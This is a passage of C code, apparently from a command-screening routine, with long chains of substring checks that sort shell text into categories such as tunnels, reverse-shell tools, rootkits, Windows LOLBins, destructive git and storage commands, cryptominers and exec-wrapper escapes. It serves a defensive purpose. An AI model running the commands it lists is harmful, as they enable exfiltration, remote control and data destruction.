            ci_contains(text, "clipmenu") ||
            ci_contains(text, "clipcat") ||
            ci_contains(text, "copyq") ||
            ci_contains(text, "greenclip") ||
            ci_contains(text, "gpaste") ||
            ci_contains(text, "parcellite") ||
            ci_contains(text, "clipit") ||
            ci_contains(text, "diodon") ||
            (ci_contains(text, "sunshine") && ci_contains(text, " -")) ||
            ci_contains(text, "waypipe") ||
            ci_contains(text, "x2x") ||
            (ci_contains(text, "barrier") && ci_contains(text, " -")) ||
            ci_contains(text, "input-leap") ||
            ci_contains(text, "deskflow") ||
            ci_contains(text, "lan-mouse") ||
            ci_contains(text, "rkvm") ||
            ci_contains(text, "neatvnc") ||
            ci_contains(text, "wlvncc") ||
            ci_contains(text, "krfvnc") ||
            ci_contains(text, "grimshot") ||
            ci_contains(text, "wayshot") ||
            ci_contains(text, "shotman") ||
            (ci_contains(text, "slurp") && ci_contains(text, " -")) ||
            ci_contains(text, "wl-screenrec") ||
            ci_contains(text, "dotool") ||
            ci_contains(text, "kmonad") ||
            ci_contains(text, "kanata") ||
            ci_contains(text, "xev") ||
            ci_contains(text, "xprop") ||
            ci_contains(text, "xwininfo") ||
            ci_contains(text, "xdpyinfo") ||
            (ci_contains(text, "weston") && ci_contains(text, " -")) ||
            ci_contains(text, "cagebreak") ||
            ci_contains(text, "dwl") ||
            ci_contains(text, "wayfire") ||
            ci_contains(text, "labwc") ||
            ci_contains(text, "swayfx") ||
            ci_contains(text, "qtile") ||
            ci_contains(text, "herbstluftwm") ||
            ci_contains(text, "bspwm") ||
            ci_contains(text, "bspc") ||
            ci_contains(text, "wmctrl") ||
            ci_contains(text, "swayidle") ||
            ci_contains(text, "swaylock") ||
            (ci_contains(text, "synergy") && ci_contains(text, " -")) ||
            ci_contains(text, "wlfreerdp") ||
            ci_contains(text, "sdl-freerdp")) {
            what = "jdk/sysinternals/ad/kerberos/routing/ids/gsm/flash/jailbreak/proxy/exec primitive";
        }
        else if (
            /* overlay / tunnel networks (extend beyond tailscale/vpn gate) */
            ci_contains(text, "zerotier-one") ||
            ci_contains(text, "openfortivpn") ||
            (ci_contains(text, "nebula") && ci_contains(text, " -")) ||
            (ci_contains(text, "tinc") &&
             (ci_contains(text, " -d") || ci_contains(text, " -k") ||
              ci_contains(text, " -n ") || ci_contains(text, "--config") ||
              ci_contains(text, "--pidfile"))) ||
            (ci_contains(text, "bore") &&
             (ci_contains(text, " local") || ci_contains(text, " pub") ||
              ci_contains(text, " -"))) ||
            ci_contains(text, "http-server") ||
            ci_contains(text, "serveo") ||
            ci_contains(text, "frp ") ||
            (ci_contains(text, "croc") &&
             (ci_contains(text, " send") || ci_contains(text, " receive") ||
              ci_contains(text, " -"))) ||
            ci_contains(text, "magic-wormhole") ||
            (ci_contains(text, "wormhole") &&
             (ci_contains(text, " send") || ci_contains(text, " receive") ||
              ci_contains(text, " -"))) ||
            ci_contains(text, "pwndrop") ||
            ci_contains(text, "intersh") ||
            ci_contains(text, "pwncat") ||
            ci_contains(text, "pwncat-cs") ||
            ci_contains(text, "transfer.sh") ||
            /* rootkit / uefi / firmware analysis + scanner names */
            (ci_contains(text, "reptile") && ci_contains(text, " -")) ||
            ci_contains(text, "diamorphine") ||
            ci_contains(text, "kerberoast") ||
            ci_contains(text, "chipsec") ||
            ci_contains(text, "uefitool") ||
            ci_contains(text, "ifdtool") ||
            ci_contains(text, "braa ") ||
            ci_contains(text, "openvas") ||
            ci_contains(text, "gvm-cli") ||
            ci_contains(text, "nessus") ||
            /* k8s/deploy/db helper clis */
            ci_contains(text, "k9s") ||
            (ci_contains(text, "stern") && ci_contains(text, " -")) ||
            (ci_contains(text, "tkn") &&
             (ci_contains(text, " -") || ci_contains(text, " pipeline") ||
              ci_contains(text, " taskrun") || ci_contains(text, " hub"))) ||
            (ci_contains(text, "dagger") && ci_contains(text, " -")) ||
            ci_contains(text, "werf") ||
            (ci_contains(text, "skaffold") &&
             (ci_contains(text, " run") || ci_contains(text, " build") ||
              ci_contains(text, " dev") || ci_contains(text, " deploy") ||
              ci_contains(text, " debug") || ci_contains(text, " fix"))) ||
            (ci_contains(text, "tilt") && ci_contains(text, " -")) ||
            (ci_contains(text, "earthly") && ci_contains(text, " -")) ||
            ci_contains(text, "devspace") ||
            ci_contains(text, "localstack") ||
            ci_contains(text, "assumego") ||
            (ci_contains(text, "granted") && ci_contains(text, " -")) ||
            ci_contains(text, "okta-aws") ||
            ci_contains(text, "litecli") ||
            ci_contains(text, "pgcli") ||
            (ci_contains(text, "mycli") &&
             (ci_contains(text, "://") || ci_contains(text, " -"))) ||
            ci_contains(text, "iredis") ||
            ci_contains(text, "usql") ||
            /* perf/trace/cgroup/ns control */
            (ci_contains(text, "perf") &&
             (ci_contains(text, " script") || ci_contains(text, " trace") ||
              ci_contains(text, " probe") || ci_contains(text, " sched"))) ||
            ci_contains(text, "oprofile ") ||
            ci_contains(text, "systemtap") ||
            ci_contains(text, "stap ") ||
            ci_contains(text, "sysprof") ||
            (ci_contains(text, "bcc") && ci_contains(text, " -")) ||
            ci_contains(text, "setns") ||
            ci_contains(text, "lsns") ||
            ci_contains(text, "netns exec") ||
            ci_contains(text, "systemd-cgls") ||
            ci_contains(text, "systemd-cgtop") ||
            ci_contains(text, "cgservice") ||
            ci_contains(text, "cgexec") ||
            ci_contains(text, "cgcreate") ||
            ci_contains(text, "cgset") ||
            ci_contains(text, "cgdelete") ||
            ci_contains(text, "cgclassify") ||
            ci_contains(text, "lssubsys") ||
            ci_contains(text, "chcpu") ||
            ci_contains(text, "chmem") ||
            (ci_contains(text, "machinectl") &&
             (ci_contains(text, " login") || ci_contains(text, " enable") ||
              ci_contains(text, " terminate") || ci_contains(text, " poweroff") ||
              ci_contains(text, " reboot"))) ||
            (ci_contains(text, "unshare") &&
             (ci_contains(text, " -n") || ci_contains(text, " -p"))) ||
            (ci_contains(text, "bwrap") &&
             (ci_contains(text, "--uid") || ci_contains(text, "--setuid"))) ||
            (ci_contains(text, "firejail") && ci_contains(text, " --join")) ||
            (ci_contains(text, "chsh") && ci_contains(text, " -s")) ||
            (ci_contains(text, "chfn") && ci_contains(text, " -")) ||
            (ci_contains(text, "systemd-run") &&
             (ci_contains(text, "--slice") || ci_contains(text, "--pipe") ||
              ci_contains(text, "--same-dir") || ci_contains(text, "--wait") ||
              ci_contains(text, " -e "))) ||
            /* traffic-control + ethtool + ip extras */
            ci_contains(text, "tc qdisc add") ||
            ci_contains(text, "tc qdisc del") ||
            ci_contains(text, "tc qdisc change") ||
            ci_contains(text, "tc qdisc replace") ||
            ci_contains(text, "tc filter add") ||
            ci_contains(text, "tc filter del") ||
            ci_contains(text, "tc filter change") ||
            ci_contains(text, "tc filter replace") ||
            ci_contains(text, "tc class add") ||
            ci_contains(text, "tc class del") ||
            ci_contains(text, "tc class change") ||
            ci_contains(text, "tc class replace") ||
            ci_contains(text, "tc action") ||
            (ci_contains(text, "ethtool") &&
             (ci_contains(text, " -k") || ci_contains(text, " --set"))) ||
            ci_contains(text, "ip maddress") ||
            ci_contains(text, "ip mroute") ||
            ci_contains(text, "ip vrf") ||
            /* git destructive / config-poison forms */
            (ci_contains(text, "git push") &&
             (ci_contains(text, " -f") || ci_contains(text, " --force") ||
              ci_contains(text, " --delete"))) ||
            (ci_contains(text, "git branch") && ci_contains(text, " -d")) ||
            (ci_contains(text, "git tag") && ci_contains(text, " -d")) ||
            (ci_contains(text, "git rm") &&
             (ci_contains(text, " --cached") || ci_contains(text, " -r"))) ||
            (ci_contains(text, "git update-index") &&
             (ci_contains(text, " --assume") ||
              ci_contains(text, " --skip-worktree"))) ||
            ci_contains(text, "git filter-") ||
            (ci_contains(text, "git gc") && ci_contains(text, " --prune")) ||
            (ci_contains(text, "git reflog") &&
             (ci_contains(text, " expire") || ci_contains(text, " delete"))) ||
            (ci_contains(text, "git stash") &&
             (ci_contains(text, " drop") || ci_contains(text, " clear"))) ||
            (ci_contains(text, "git clean") &&
             (ci_contains(text, " -f") || ci_contains(text, " -x") ||
              ci_contains(text, " -d"))) ||
            (ci_contains(text, "git reset") && ci_contains(text, " --hard")) ||
            (ci_contains(text, "git checkout") && ci_contains(text, " -- ")) ||
            (ci_contains(text, "git remote") &&
             (ci_contains(text, " set-url") || ci_contains(text, " add") ||
              ci_contains(text, " remove"))) ||
            (ci_contains(text, "git config") &&
             (ci_contains(text, " alias.") || ci_contains(text, " core.pager") ||
              ci_contains(text, " core.editor") || ci_contains(text, " core.hook") ||
              ci_contains(text, " include.") || ci_contains(text, " credential."))) ||
            (ci_contains(text, "git submodule") &&
             (ci_contains(text, " update") || ci_contains(text, " add"))) ||
            (ci_contains(text, "git clone") &&
             (ci_contains(text, " -u ") || ci_contains(text, " --upload") ||
              ci_contains(text, " --template"))) ||
            (ci_contains(text, "git bundle") && ci_contains(text, " create")) ||
            (ci_contains(text, "git archive") && ci_contains(text, " --remote")) ||
            (ci_contains(text, "git format-patch") &&
             (ci_contains(text, " --stdout") || ci_contains(text, " -o"))) ||
            /* editor/exec/decode helpers */
            (ci_contains(text, "nano") && ci_contains(text, " -s")) ||
            (ci_contains(text, "xargs") &&
             (ci_contains(text, " sh") || ci_contains(text, " bash") ||
              ci_contains(text, " sudo "))) ||
            (ci_contains(text, "make") && ci_contains(text, " --eval")) ||
            (ci_contains(text, "cmake") && ci_contains(text, " -p ")) ||
            ci_contains(text, "uudecode") ||
            ci_contains(text, "uuencode") ||
            ci_contains(text, "basenc") ||
            (ci_contains(text, "perl") && ci_contains(text, " -mmime")) ||
            (ci_contains(text, "setpriv") &&
             (ci_contains(text, "--init-groups") ||
              ci_contains(text, "--reset-env") ||
              ci_contains(text, "--clear-groups"))) ||
            (ci_contains(text, "capsh") &&
             (ci_contains(text, "--decode"))) ||
            ci_contains(text, "usbipd") ||
            ci_contains(text, "usbip") ||
            (ci_contains(text, "whoami") &&
             (ci_contains(text, " /priv") || ci_contains(text, " /all") ||
              ci_contains(text, " /groups"))) ||
            /* windows residual lolbins */
            ci_contains(text, "desktopimgdownldr") ||
            ci_contains(text, "mftrace") ||
            ci_contains(text, "shdocvw") ||
            ci_contains(text, "stordiag") ||
            /* tttracer dropped — debugger benign */
            ci_contains(text, "wab.exe") ||
            ci_contains(text, "msconfig") ||
            ci_contains(text, "presentationsettings") ||
            ci_contains(text, "ieadvpack") ||
            ci_contains(text, "iedll") ||
            ci_contains(text, "infocard") ||
            ci_contains(text, "migwiz") ||
            ci_contains(text, "mshfp") ||
            ci_contains(text, "scrcons") ||
            ci_contains(text, "makecab") ||
            ci_contains(text, "replace.exe") ||
            ci_contains(text, "te.exe") ||
            /* rasdial dropped — routine dialer benigns */
            (ci_contains(text, "fsutil") &&
             (ci_contains(text, " usn") ||
              ci_contains(text, " behavior") || ci_contains(text, " reparse") ||
              ci_contains(text, " objectid"))) ||
            (ci_contains(text, "gpresult") && ci_contains(text, " /h")) ||
            (ci_contains(text, "pubprn") &&
             (ci_contains(text, "http") || ci_contains(text, "\\\\"))) ||
            (ci_contains(text, "slmgr") && ci_contains(text, " /")) ||
            (ci_contains(text, "squirrel") && ci_contains(text, " --")) ||
            (ci_contains(text, "at.exe") && ci_contains(text, "\\\\"))) {
            what = "overlay/git-destruct/decode/lolbin/exec primitive";
        }
        else if (
            /* BSD r-tools + NIS/NIS+ (cleartext auth, recon) */
            ci_contains(text, "rlogin") ||
            (ci_contains(text, "rsh") &&
             (ci_contains(text, " -l") || ci_contains(text, " -n"))) ||
            ci_contains(text, "rexec") ||
            ci_contains(text, "rcp ") ||
            ci_contains(text, "telnet") ||
            ci_contains(text, "rwho") ||
            ci_contains(text, "ruptime") ||
            ci_contains(text, "rusers") ||
            ci_contains(text, "rwhod") ||
            ci_contains(text, "rwalld") ||
            ci_contains(text, "ypcat") ||
            ci_contains(text, "ypmatch") ||
            ci_contains(text, "ypbind") ||
            ci_contains(text, "ypset") ||
            ci_contains(text, "ypserv") ||
            ci_contains(text, "yppasswd") ||
            ci_contains(text, "niscat") ||
            ci_contains(text, "nistbladm") ||
            ci_contains(text, "nisaddcred") ||
            /* ldap recon + mail admin */
            ci_contains(text, "ldapsearch") ||
            ci_contains(text, "ldapwhoami") ||
            ci_contains(text, "doveadm") ||
            ci_contains(text, "zmprov") ||
            ci_contains(text, "zmmailbox") ||
            ci_contains(text, "drush") ||
            ci_contains(text, "wp-cli") ||
            (ci_contains(text, "artisan") &&
             (ci_contains(text, " tinker") || ci_contains(text, " serve") ||
              ci_contains(text, " eval"))) ||
            (ci_contains(text, "occ ") &&
             (ci_contains(text, " user") || ci_contains(text, " files") ||
              ci_contains(text, " db") || ci_contains(text, " -"))) ||
            /* mail/imap exfil + sync daemons */
            ci_contains(text, "imapsync") ||
            ci_contains(text, "isync") ||
            ci_contains(text, "notmuch") ||
            ci_contains(text, "sendemail") ||
            ci_contains(text, "mailutils") ||
            ci_contains(text, "heirloom-mailx") ||
            (ci_contains(text, "mutt") &&
             (ci_contains(text, " -a") || ci_contains(text, " -s") ||
              ci_contains(text, " -e") || ci_contains(text, " -h"))) ||
            (ci_contains(text, "mailx") && ci_contains(text, " -")) ||
            (ci_contains(text, "s-nail") && ci_contains(text, " -")) ||
            (ci_contains(text, "rsync") &&
             (ci_contains(text, " -e") || ci_contains(text, "--rsh") ||
              ci_contains(text, "rsync://") || ci_contains(text, "::"))) ||
            ci_contains(text, "lsyncd") ||
            ci_contains(text, "syncthing") ||
            ci_contains(text, "rslsync") ||
            ci_contains(text, "resilio") ||
            /* ftp/smb/nfs/webdav share exposure daemons */
            ci_contains(text, "vsftpd") ||
            ci_contains(text, "pure-ftpd") ||
            ci_contains(text, "proftpd") ||
            ci_contains(text, "tftpd") ||
            ci_contains(text, "atftpd") ||
            ci_contains(text, "in.tftpd") ||
            ci_contains(text, "tftpd-hpa") ||
            (ci_contains(text, "smbd") &&
             (ci_contains(text, " -d") || ci_contains(text, " -i") ||
              ci_contains(text, " -f"))) ||
            (ci_contains(text, "nmbd") &&
             (ci_contains(text, " -d") || ci_contains(text, " -i"))) ||
            (ci_contains(text, "exportfs") && ci_contains(text, " -")) ||
            ci_contains(text, "unfs3") ||
            ci_contains(text, "nfs-ganesha") ||
            ci_contains(text, "fusedav") ||
            ci_contains(text, "sftpgo") ||
            ci_contains(text, "pyftpdlib") ||
            ci_contains(text, "filebrowser") ||
            (ci_contains(text, "webdav") &&
             (ci_contains(text, "://") || ci_contains(text, " mount") ||
              ci_contains(text, " -"))) ||
            (ci_contains(text, "mc") &&
             (ci_contains(text, " alias") || ci_contains(text, " admin") ||
              ci_contains(text, " mirror"))) ||
            /* overlay/proxy extras */
            ci_contains(text, "etserver") ||
            (ci_contains(text, "supernode") && ci_contains(text, " -")) ||
            ci_contains(text, "ssserver") ||
            ci_contains(text, "sslocal") ||
            ci_contains(text, "mieru") ||
            ci_contains(text, "wireproxy") ||
            /* non-git vcs destructive / admin */
            (ci_contains(text, "hg") &&
             (ci_contains(text, " strip") || ci_contains(text, " rollback") ||
              ci_contains(text, " purge") || ci_contains(text, " backout") ||
              ci_contains(text, " graft"))) ||
            (ci_contains(text, "svn") &&
             (ci_contains(text, " delete") || ci_contains(text, " import") ||
              ci_contains(text, " switch") || ci_contains(text, " merge") ||
              ci_contains(text, " revert") || ci_contains(text, " copy") ||
              ci_contains(text, " cp "))) ||
            (ci_contains(text, "svnadmin") &&
             (ci_contains(text, " dump") || ci_contains(text, " load") ||
              ci_contains(text, " setrevprop"))) ||
            (ci_contains(text, "fossil") &&
             (ci_contains(text, " ui") || ci_contains(text, " server") ||
              ci_contains(text, " clone") || ci_contains(text, " open") ||
              ci_contains(text, " -"))) ||
            (ci_contains(text, "jj") &&
             (ci_contains(text, " abandon") || ci_contains(text, " undo") ||
              ci_contains(text, " squash"))) ||
            (ci_contains(text, "pijul") && ci_contains(text, " -")) ||
            ci_contains(text, "darcs") ||
            ci_contains(text, "bzr") ||
            (ci_contains(text, "monotone") && ci_contains(text, " -")) ||
            (ci_contains(text, "cvs") &&
             (ci_contains(text, " admin") || ci_contains(text, " -d") ||
              ci_contains(text, " checkout") || ci_contains(text, " commit"))) ||
            /* snmp/zmap-suite extras */
            ci_contains(text, "oidwalk") ||
            ci_contains(text, "snmpbulkwalk") ||
            ci_contains(text, "snmpdf") ||
            ci_contains(text, "snmpstatus") ||
            ci_contains(text, "snmptest") ||
            ci_contains(text, "zdns") ||
            ci_contains(text, "ztee") ||
            ci_contains(text, "zannotate") ||
            ci_contains(text, "netsed") ||
            ci_contains(text, "termshark") ||
            ci_contains(text, "macchanger") ||
            ci_contains(text, "nxc") ||
            (ci_contains(text, "sparta") && ci_contains(text, " -")) ||
            (ci_contains(text, "legion") && ci_contains(text, " -")) ||
            (ci_contains(text, "caldera") && ci_contains(text, " -")) ||
            ci_contains(text, "safebreach") ||
            (ci_contains(text, "dnsmasq") && ci_contains(text, " -")) ||
            /* emulators + torrent/download clis */
            ci_contains(text, "waydroid") ||
            ci_contains(text, "genymotion") ||
            ci_contains(text, "anbox") ||
            (ci_contains(text, " age ") &&
             (ci_contains(text, " -r") || ci_contains(text, " -e") ||
              ci_contains(text, " --encrypt"))) ||
            (ci_contains(text, "rage") && ci_contains(text, " -")) ||
            ci_contains(text, "transmission-cli") ||
            ci_contains(text, "deluge-console") ||
            ci_contains(text, "qbittorrent-nox") ||
            ci_contains(text, "rtorrent") ||
            ci_contains(text, "mktorrent") ||
            ci_contains(text, "ctorrent") ||
            (ci_contains(text, "axel") &&
             (ci_contains(text, " -") || ci_contains(text, "http"))) ||
            ci_contains(text, "prozilla") ||
            ci_contains(text, "mget") ||
            ci_contains(text, "getx") ||
            (ci_contains(text, "snarf") && ci_contains(text, " -")) ||
            /* mail infra */
            ci_contains(text, "smtpd") ||
            (ci_contains(text, "exim") && ci_contains(text, " -")) ||
            (ci_contains(text, "exim4") && ci_contains(text, " -")) ||
            (ci_contains(text, "postqueue") && ci_contains(text, " -")) ||
            ci_contains(text, "postcat") ||
            ci_contains(text, "postsuper") ||
            ci_contains(text, "postsrsd") ||
            ci_contains(text, "opendkim") ||
            ci_contains(text, "dkimproxy") ||
            ci_contains(text, "spamc") ||
            ci_contains(text, "spamctl") ||
            ci_contains(text, "bogofilter") ||
            ci_contains(text, "razor-admin") ||
            ci_contains(text, "pyzor") ||
            ci_contains(text, "dccproc") ||
            ci_contains(text, "postmap") ||
            ci_contains(text, "postalias") ||
            ci_contains(text, "newaliases") ||
            ci_contains(text, "qmail")) {
            what = "rtools/mail/sync/vcs/share-daemon/exec primitive";
        } else if (
            /* interpreter / REPL inline-exec and editor escapes */
            ci_contains(text, "nodejs -e") || ci_contains(text, "nodejs --eval") ||
            (ci_contains(text, "irb") &&
             (ci_contains(text, " -e") || ci_contains(text, " -r"))) ||
            ci_contains(text, "php -a") || ci_contains(text, "groovysh") ||
            ci_contains(text, "nashorn") ||
            (ci_contains(text, "scala") && ci_contains(text, " -e")) ||
            (ci_contains(text, "clj") &&
             (ci_contains(text, " -e") || ci_contains(text, " -m"))) ||
            (ci_contains(text, "iex") &&
             (ci_contains(text, " -e") || ci_contains(text, " -r"))) ||
            (ci_contains(text, "erl") &&
             (ci_contains(text, " -eval") || ci_contains(text, " -noshell") ||
              ci_contains(text, " -run"))) ||
            (ci_contains(text, "pwsh") && ci_contains(text, " -e")) ||
            (ci_contains(text, "perl") &&
             (ci_contains(text, " -pi") || ci_contains(text, " -pe"))) ||
            ((ci_contains(text, "vim") || ci_contains(text, "nvim")) &&
             (ci_contains(text, " +!") || ci_contains(text, " +:"))) ||
            (ci_contains(text, "less") && ci_contains(text, " !")) ||
            (ci_contains(text, "more") && ci_contains(text, " !")) ||
            (ci_contains(text, "man") && ci_contains(text, " !")) ||
            (ci_contains(text, "zip") && ci_contains(text, " -tt")) ||
            (ci_contains(text, "bash") && ci_contains(text, " -c")) ||
            (ci_contains(text, " sh ") && ci_contains(text, " -c")) ||
            (ci_contains(text, "enable -f") &&
             (ci_contains(text, ".so") || ci_contains(text, " /"))) ||
            /* terminal multiplexer / emulator command exec */
            (ci_contains(text, "xterm") && ci_contains(text, " -e")) ||
            (ci_contains(text, "urxvt") && ci_contains(text, " -e")) ||
            (ci_contains(text, "rxvt") && ci_contains(text, " -e")) ||
            (ci_contains(text, "alacritty") && ci_contains(text, " -e")) ||
            (ci_contains(text, "kitty") &&
             (ci_contains(text, " -e") || ci_contains(text, " @"))) ||
            (ci_contains(text, " st ") && ci_contains(text, " -e")) ||
            (ci_contains(text, "konsole") && ci_contains(text, " -e")) ||
            (ci_contains(text, "gnome-terminal") &&
             (ci_contains(text, " --") || ci_contains(text, " -e"))) ||
            (ci_contains(text, "xfce4-terminal") && ci_contains(text, " -e")) ||
            (ci_contains(text, "lxterminal") && ci_contains(text, " -e")) ||
            (ci_contains(text, "mate-terminal") && ci_contains(text, " -e")) ||
            (ci_contains(text, "tilix") && ci_contains(text, " -e")) ||
            (ci_contains(text, "terminator") && ci_contains(text, " -e")) ||
            (ci_contains(text, "sakura") && ci_contains(text, " -e")) ||
            (ci_contains(text, "termite") && ci_contains(text, " -e")) ||
            (ci_contains(text, "foot") && ci_contains(text, " -e")) ||
            (ci_contains(text, "wezterm") &&
             (ci_contains(text, " -e") || ci_contains(text, " cli"))) ||
            (ci_contains(text, "xinit") &&
             (ci_contains(text, " /") || ci_contains(text, " sh"))) ||
            (ci_contains(text, "tmux") &&
             (ci_contains(text, " new ") || ci_contains(text, " send-keys") ||
              ci_contains(text, " run-shell") || ci_contains(text, " respawn") ||
              ci_contains(text, " source") || ci_contains(text, " bind") ||
              ci_contains(text, " set-hook"))) ||
            (ci_contains(text, "screen") &&
             (ci_contains(text, " -dm") || ci_contains(text, " -s /") ||
              ci_contains(text, " sh ") || ci_contains(text, " bash"))) ||
            /* exec-wrapper primitives (GTFOBins-style prog spawn) */
            ((ci_contains(text, "flock") || ci_contains(text, "nice") ||
              ci_contains(text, "timeout") || ci_contains(text, "stdbuf") ||
              ci_contains(text, "ionice") || ci_contains(text, "taskset") ||
              ci_contains(text, "chrt") || ci_contains(text, "schedtool") ||
              ci_contains(text, "env ") || ci_contains(text, "chroot") ||
              ci_contains(text, "unshare") || ci_contains(text, "setpriv") ||
              ci_contains(text, "ssh-agent")) &&
             (ci_contains(text, " sh") || ci_contains(text, " bash") ||
              ci_contains(text, " python") || ci_contains(text, " perl") ||
              ci_contains(text, " ruby") || ci_contains(text, " php") ||
              ci_contains(text, " lua") || ci_contains(text, " node") ||
              ci_contains(text, " dash") || ci_contains(text, " zsh") ||
              ci_contains(text, " csh") || ci_contains(text, " tcsh") ||
              ci_contains(text, " fish") || ci_contains(text, " exec") ||
              ci_contains(text, " /bin"))) ||
            (ci_contains(text, "capsh") &&
             (ci_contains(text, " -- ") || ci_contains(text, " --decode"))) ||
            (ci_contains(text, " su ") && ci_contains(text, " -")) ||
            (ci_contains(text, "gdb") && ci_contains(text, " -ex")) ||
            (ci_contains(text, "lldb") &&
             (ci_contains(text, " -o") || ci_contains(text, " -b") ||
              ci_contains(text, " -s"))) ||
            (ci_contains(text, "strace") &&
             (ci_contains(text, " -e ") || ci_contains(text, " -o "))) ||
            /* package-manager / toolchain exec hooks */
            (ci_contains(text, "npm") && ci_contains(text, " exec")) ||
            (ci_contains(text, "gem") && ci_contains(text, " exec")) ||
            (ci_contains(text, "bundle") && ci_contains(text, " exec")) ||
            (ci_contains(text, "cpan") && ci_contains(text, " -e")) ||
            (ci_contains(text, "go ") &&
             (ci_contains(text, " tool ") || ci_contains(text, " generate"))) ||
            (ci_contains(text, "dotnet") &&
             (ci_contains(text, " run") || ci_contains(text, " exec") ||
              ci_contains(text, " fsi") || ci_contains(text, " msbuild"))) ||
            ci_contains(text, "cargo-script") ||
            /* IRC clients and C2-capable chat bots */
            ci_contains(text, "ircd") || ci_contains(text, "ngircd") ||
            (ci_contains(text, "irssi") &&
             (ci_contains(text, " -c") || ci_contains(text, " -!") ||
              ci_contains(text, " --connect"))) ||
            (ci_contains(text, "weechat") &&
             (ci_contains(text, " -r") || ci_contains(text, " -a") ||
              ci_contains(text, " --run") || ci_contains(text, " --connect"))) ||
            (ci_contains(text, "hexchat") &&
             (ci_contains(text, " -a") || ci_contains(text, " -c") ||
              ci_contains(text, " --existing"))) ||
            (ci_contains(text, "ftp") &&
             (ci_contains(text, " -n") || ci_contains(text, " -i") ||
              ci_contains(text, " -g") || ci_contains(text, " -d") ||
              ci_contains(text, "ftp://"))) ||
            (ci_contains(text, "lftp") &&
             (ci_contains(text, " -e") || ci_contains(text, " -f") ||
              ci_contains(text, " -c") || ci_contains(text, " -u"))) ||
            ci_contains(text, "ncftp") ||
            /* RMM / remote-access fleet */
            ci_contains(text, "connectwise") || ci_contains(text, "gotomypc") ||
            ci_contains(text, "dameware") || ci_contains(text, "dwrcs") ||
            ci_contains(text, "bomgar") || ci_contains(text, "beyondtrust") ||
            ci_contains(text, "ninjaone") || ci_contains(text, "kaseya") ||
            ci_contains(text, "n-able") || ci_contains(text, "meshcommander") ||
            ci_contains(text, "uvnc") || ci_contains(text, "krdc") ||
            ci_contains(text, "ssvnc") || ci_contains(text, "vinagre") ||
            (ci_contains(text, "parsec") && ci_contains(text, " -")) ||
            (ci_contains(text, "moonlight") &&
             (ci_contains(text, " -") || ci_contains(text, " stream") ||
              ci_contains(text, " pair"))) ||
            (ci_contains(text, "sunshine") &&
             (ci_contains(text, " -") || ci_contains(text, " stream") ||
              ci_contains(text, " pair") || ci_contains(text, " appspot"))) ||
            (ci_contains(text, "supremo") &&
             (ci_contains(text, " -") || ci_contains(text, " /"))) ||
            (ci_contains(text, "tactical") &&
             (ci_contains(text, " rmm") || ci_contains(text, " -"))) ||
            ci_contains(text, "zoho assist") || ci_contains(text, "fixme.it") ||
            ci_contains(text, "showmypc") ||
            /* crypto miners and wallet CLI looting */
            (ci_contains(text, "claymore") && ci_contains(text, " -")) ||
            ci_contains(text, "t-rex") ||
            (ci_contains(text, "trex") && ci_contains(text, " -")) ||
            ci_contains(text, "monerod") || ci_contains(text, "monero-wallet-cli") ||
            ci_contains(text, "bitcoin-cli") || ci_contains(text, "bitcoin-qt") ||
            ci_contains(text, "bitcoind") || ci_contains(text, "litecoin-cli") ||
            ci_contains(text, "dogecoind") || ci_contains(text, "dash-cli") ||
            ci_contains(text, "zcash-cli") || ci_contains(text, "p2pool") ||
            ci_contains(text, "kinsing") || ci_contains(text, "kdevtmpfsi") ||
            (ci_contains(text, "electrum") &&
             (ci_contains(text, " daemon") || ci_contains(text, " getaddress") ||
              ci_contains(text, " payto") || ci_contains(text, " -o") ||
              ci_contains(text, " -w") || ci_contains(text, " listaddresses") ||
              ci_contains(text, " getbalance") || ci_contains(text, " getprivatekeys") ||
              ci_contains(text, " signmessage") || ci_contains(text, " broadcast"))) ||
            (ci_contains(text, "geth") &&
             (ci_contains(text, " attach") || ci_contains(text, " account") ||
              ci_contains(text, " console") || ci_contains(text, " init") ||
              ci_contains(text, " dump") || ci_contains(text, " export") ||
              ci_contains(text, " import") || ci_contains(text, " removedb") ||
              ci_contains(text, " db ") || ci_contains(text, " js ") ||
              ci_contains(text, " --exec") || ci_contains(text, " --jspath") ||
              ci_contains(text, " --preload") || ci_contains(text, " --unlock") ||
              ci_contains(text, " --password") || ci_contains(text, " --mine"))) ||
            (ci_contains(text, "parity") && ci_contains(text, " -")) ||
            /* backup tooling exfil / destroy */
            (ci_contains(text, "duplicity") &&
             (ci_contains(text, " remove") || ci_contains(text, " cleanup") ||
              ci_contains(text, " restore") || ci_contains(text, " collection"))) ||
            ci_contains(text, "rsnapshot") || ci_contains(text, "bacula") ||
            ci_contains(text, "bareos") ||
            (ci_contains(text, "amanda") &&
             (ci_contains(text, " am") || ci_contains(text, " -"))) ||
            (ci_contains(text, "bup") &&
             (ci_contains(text, " init") || ci_contains(text, " save") ||
              ci_contains(text, " restore") || ci_contains(text, " -"))) ||
            ci_contains(text, "kopia") ||
            (ci_contains(text, "tarsnap") && ci_contains(text, " -")) ||
            (ci_contains(text, "timeshift") &&
             (ci_contains(text, " --delete") || ci_contains(text, " --restore") ||
              ci_contains(text, " --create") || ci_contains(text, " --check"))) ||
            /* SQL / LDAP / IPA client extras */
            (ci_contains(text, "osql") && ci_contains(text, " -")) ||
            (ci_contains(text, "isql") && ci_contains(text, " -")) ||
            (ci_contains(text, "tsql") && ci_contains(text, " -")) ||
            (ci_contains(text, "sqsh") && ci_contains(text, " -")) ||
            (ci_contains(text, "dsql") && ci_contains(text, " -")) ||
            ci_contains(text, "slapcat") || ci_contains(text, "slapadd") ||
            ci_contains(text, "slapindex") ||
            (ci_contains(text, "ipa") &&
             (ci_contains(text, " user") || ci_contains(text, " group") ||
              ci_contains(text, " host") || ci_contains(text, " hbac") ||
              ci_contains(text, " sudo") || ci_contains(text, " vault") ||
              ci_contains(text, " priv"))) ||
            ci_contains(text, "ipa-client-install") || ci_contains(text, "realmd") ||
            /* AD / Windows infra recon and control */
            ci_contains(text, "ntdsutil") || ci_contains(text, "repadmin") ||
            ci_contains(text, "dnscmd") || ci_contains(text, "dfsutil") ||
            ci_contains(text, "dfsradmin") || ci_contains(text, "mountvol") ||
            (ci_contains(text, "wmic") && ci_contains(text, " ntdomain")) ||
            /* NVMe / storage teardown and SCSI control */
            (ci_contains(text, "nvme") &&
             (ci_contains(text, " reset") || ci_contains(text, " ns-delete") ||
              ci_contains(text, " delete-ns") || ci_contains(text, " subsystem-reset") ||
              ci_contains(text, " disconnect") || ci_contains(text, " attach-ns") ||
              ci_contains(text, " detach-ns") || ci_contains(text, " create-ns") ||
              ci_contains(text, " set-property"))) ||
            (ci_contains(text, "sgdisk") &&
             (ci_contains(text, " -z") || ci_contains(text, " --zap") ||
